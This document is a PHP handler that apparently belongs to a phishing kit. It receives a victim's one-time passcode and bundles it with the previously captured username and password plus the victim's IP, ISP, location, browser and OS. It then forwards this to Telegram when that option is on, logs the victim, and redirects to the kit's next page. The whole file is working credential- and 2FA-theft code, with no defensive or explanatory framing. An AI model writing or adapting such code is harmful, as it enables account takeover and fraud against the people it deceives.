<?php
session_start();

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include 'functions/Result.php'; // Include necessary functions

// Handle POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handlePostRequest();
} else {
    // Redirect to error page if not a POST request
    redirectToErrorPage("99dea78007133396a7b8ed70578ac6ae");
}

// Handle POST request logic
function handlePostRequest() {
    // Store POST data in session variables
    storePostDataInSession($_POST);

    // Process and send the results
    processFullInformation();
}

// Store POST data into session variables
function storePostDataInSession($postData) {
    // Fields to store from POST request
    $fields = [
        'otp'
    ];

    // Store each field in the session if it exists in the POST data
    foreach ($fields as $field) {
        if (isset($postData[$field])) {
            $_SESSION[$field] = $postData[$field];
        }
    }
}

// Process the full information, send emails, and log activity
function processFullInformation() {
    global $ip, $connectionisp, $countryname, $countrycode, $regioncity, $citykota, $os, $br, $settings;

    // Send Full Info result to Telegram if enabled
    if (isset($settings['resulttotele']) && $settings['resulttotele'] === 'on') {
        sendFullInfoResultToTelegram();
    }

    // Log activity to file
    logActivity();

    // Redirect to the next page
    redirectToNextPage();
}

// Send the Full Info result to Telegram
function sendFullInfoResultToTelegram() {
    global $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os;

    sendResult(generateOTPLoginMessage(
        $_SESSION['username'], $_SESSION['passwordlogin'], $_SESSION['otp'], 
        date('l d F H:i:s'), $ip, $connectionisp, $countryname, $regioncity, $citykota, $br, $os
    ));
}

// Log activity to the log file
function logActivity() {
    global $countryname, $ip, $br, $os;

    $logEntry = "|" . date("l d F H:i:s") . "|$countryname|$ip|$br|$os|Human Input OTP\n";
    file_put_contents("logs/activity.txt", $logEntry, FILE_APPEND);

    $logEntry = "|" . date("l d F H:i:s") . "|$countryname|$ip|$br|$os|Input OTP\n";
    file_put_contents("logs/total_otp.txt", $logEntry, FILE_APPEND);
}

// Redirect to the error page with a specific error code
function redirectToErrorPage($errorCode) {
    header("Location: ?infoPage=$errorCode&error=true");
    exit;
}

// Redirect to the next page after success
function redirectToNextPage() {
    header("Location: ap?infoPage=ce8ae9da5b7cd6c3df2929543a9af92d");
    exit;
}
?>